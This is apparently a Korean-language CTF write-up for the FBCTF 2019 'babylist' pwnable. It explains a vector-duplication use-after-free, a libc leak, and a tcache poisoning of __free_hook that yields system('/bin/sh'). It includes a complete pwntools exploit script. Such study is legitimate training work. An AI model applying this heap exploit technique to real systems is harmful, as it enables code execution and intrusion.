---
title: FBCTF 2019 - babylist
categories:
 - pwnable
tags: cpp
---

```sh
$$$$$$$$$$$$$$$$$$$$$$$$$$
Welcome to babylist!
$$$$$$$$$$$$$$$$$$$$$$$$$$

1. Create a list
2. Add element to list
3. View element in list
4. Duplicate a list
5. Remove a list
6. Exit
> 
```

- Introduction
- Vunlnerability
- Exploit
- slv.py
- 느낀 점
- Reference


## Introduction

`overfloat`문제 풀고나서 해당 ctf문제를 더 풀어보기로 했다.

## Vunlnerability

`Duplicate a list`에서 vector자체를 memcpy로 복사하기 때문에 복사된것이나 복사한것에 element를 size 넘어서 추가를 해주면 delete 후 new를 해주는데 

다른 한 개는 여전히 delete된 주소를 가리키고 있어서 취약점이 발생한다.

## Exploit

`Create a list`를 하면 0x88의 크기를 가진 구조체를 new로 할당한다. 해당 구조체의 맴버로 0x70짜리 char배열, 0x18짜리 vector맴버가 존재한다.

해당 vector object에 존재하는 맴버를 보게되면

```c++
template <class _Allocator>
class _LIBCPP_TEMPLATE_VIS vector<bool, _Allocator>
    : private __vector_base_common<true>
{
public:
    typedef vector                                   __self;
    typedef bool                                     value_type;
    typedef _Allocator                               allocator_type;
    typedef allocator_traits<allocator_type>         __alloc_traits;
    typedef typename __alloc_traits::size_type       size_type;
    typedef typename __alloc_traits::difference_type difference_type;
    typedef size_type __storage_type;
    typedef __bit_iterator<vector, false>            pointer;
    typedef __bit_iterator<vector, true>             const_pointer;
    typedef pointer                                  iterator;
    typedef const_pointer                            const_iterator;
    typedef _VSTD::reverse_iterator<iterator>         reverse_iterator;
    typedef _VSTD::reverse_iterator<const_iterator>   const_reverse_iterator;
private:
    typedef typename __rebind_alloc_helper<__alloc_traits, __storage_type>::type __storage_allocator;
    typedef allocator_traits<__storage_allocator>    __storage_traits;
    typedef typename __storage_traits::pointer       __storage_pointer;
    typedef typename __storage_traits::const_pointer __const_storage_pointer;
    __storage_pointer                                      __begin_;
    size_type                                              __size_;
    __compressed_pair<size_type, __storage_allocator> __cap_alloc_;
    .
    .
    .
```

`__begin_`, `__size__`, `__cap_alloc_`이 존재한다. `Add a element` 메뉴를 사용하게 되면 vector.push_back(input)을 하게되는데 이때 `__size__`와 `__cap_alloc_`값이 같게되면 공간을 할당해준다.

```c++
template <class _Allocator>
void
vector<bool, _Allocator>::push_back(const value_type& __x)
{
    if (this->__size_ == this->capacity())
        reserve(__recommend(this->__size_ + 1));
    ++this->__size_;
    back() = __x;
}

vector<bool, _Allocator>::__recommend(size_type __new_size) const
{
    const size_type __ms = max_size();
    if (__new_size > __ms)
        this->__throw_length_error();
    const size_type __cap = capacity();
    if (__cap >= __ms / 2)
        return __ms;
    return _VSTD::max(2*__cap, __align_it(__new_size));
}

vector<bool, _Allocator>::reserve(size_type __n)
{
    if (__n > capacity())
    {
        vector __v(this->__alloc());
        __v.__vallocate(__n);
        __v.__construct_at_end(this->begin(), this->end());
        swap(__v);
        __invalidate_all_iterators();
    }
}

```

`__recommend__`함수는 보통 기존의 capacity의 두배를 리턴하는데 이때 리턴되는 값이 max_size를 넘는지 안넘는지 확인도 하게된다.
`reserve`는 넘어온 값을 토대로 새로운 vector 객체를 만든 후 기존 객체의 값을 모두 복사 한 뒤에 기존 객체는 삭제시킨다.

다시 exploit flow로 넘어오면 먼저 libc leak을 진행하기 위해 tcache가 수용할 수 있는 size보다 더 큰 chunk를 만들어야했기 때문에 충분한 양의 element를 추가한다.

그 뒤 해당 list를 `Duplicate`해서 나온 새로운 list에 다시 element를 추가해주다가 vector의 capacity가 다 차서 새로 chunk를 할당 한 후 기존의 chunk를 해제하게 되면

`Duplicate`로 얻은 list가 아닌 기존의 list는 해제된 chunk를 그대로 가리키고 있기 때문에 `View element in list`로 fd, bk에 있는 libc를 leak 할 수 있게 된다.

그 후 똑같이 0x90까지 할당 받은 후에 똑같이 `Duplicate`로 얻은 list에 추가를 계속 하다보면 기존 list의 fd에 해당 chunk의 주소가 덮어지게 된다.

나머지는 순조롭게 진행했다. 참고로 one_gadget으로 하다보면 피를 볼 수 있으므로 정직하게 `system('/bin/sh')`를 실행시키도록 하자..

~~사실 이거를 분석을 해봐야되는데... ㅎㅎ;;~~


## slv.py

```pythonimport struct
from pwn import *

p = process('./babylist')

id = [False for i in range(10)]

sla = lambda s,c : p.sendlineafter(s, str(c))

one_gadget_offset = [0x4f365, 0x4f3c2, 0x10a45c]
__malloc_hook_offset = 0x3ebc30
__free_hook_offset = 0x3ed8e8
system_offset = 0x4f4e0
binsh_str = 0x0068732f6e69622f


def Create_list(name):
    
    idx = -1
    sla('> ', 1)
    
    sla(':\n', name)
    
    for i in range(10):
        
        if id[i] == False:
            idx = i
            id[i] = True
            break
    
    if idx == -1:
        print("list is full")
        exit(0)
    
    
    return idx


def Add_element(index, number):
    
    sla('> ', 2)
    
    sla(':\n', index)
    
    sla(':\n', number)
    
    
    return


def View_element(index_list, index_elm):
    
    sla('> ', 3)
    
    sla(':\n', index_list)
    
    sla(':\n', index_elm)
    
    
    
    return p.recvuntil('\n')


def Duplicate_list(index, name):
    
    idx = -1
    
    sla('> ', 4)
    
    sla(':\n', index)
    
    sla(':\n', name)
    
    for i in range(10):
        
        if id[i] == False:
            idx = i
            id[i] = True
            break
    
    if idx == -1:
        print("list is full")
        exit(0)
    
    
    return idx


def Remove_list(index):
    
    sla('> ', 5)
    
    sla(':\n', index)
    
    id[index] = False
    
    return


def main():
    
    ########## STAGE 1 [libc leak] ###########

    
    a = Create_list('a')
    
    for i in range(400):
        Add_element(a,0);
    
    b = Duplicate_list(a, 'b')
    
    for i in range(400):
        Add_element(b,0)
    
    libc_leak = int(View_element(0,1).split(' = ')[1]) << 32
    
    libc_leak += int(View_element(0,0).split(' = ')[1]) & 0xffffffff
    
    libc_base = libc_leak - 0x3ebca0
    __malloc_hook_addr = libc_base + __malloc_hook_offset
    __free_hook_addr = libc_base + __free_hook_offset
    system_addr = libc_base + system_offset
    
    log.info('libc_base : ' + hex(libc_base))
    log.info('__malloc_hook_addr : ' + hex(__malloc_hook_addr))
    log.info('__free_hook_addr : ' + hex(__free_hook_addr))
    
    
    ########## STAGE 2 [exploit] ###########
    
   
    c = Create_list('c')
    
    for i in range(17):
        Add_element(c, i)
    
    d = Duplicate_list(c, 'd')
    
    for i in range(32):
        Add_element(d,i)
    
    for i in range(32):
        Add_element(c,i)
    
    e = Create_list(p64(__free_hook_addr))
    
    f = Create_list("dummy")
    
    Add_element(f, binsh_str & 0xffffffff)
    Add_element(f, binsh_str >> 32)
    
    
    g = Create_list(p64(system_addr))
    
    Add_element(f,2)
    
    
    p.interactive()
    
    
    
    return



if __name__ == '__main__':
    main()
    
```


## 느낀 점

1. vector 소스코드 분석을 좀 진행해봐야겠다.
2. 해당 chunk의 fd가 왜 저렇게 덮어지는지 분석해봐야겠다.
3. C++ 문제를 좀 많이 풀어봐야겠다.

## Reference
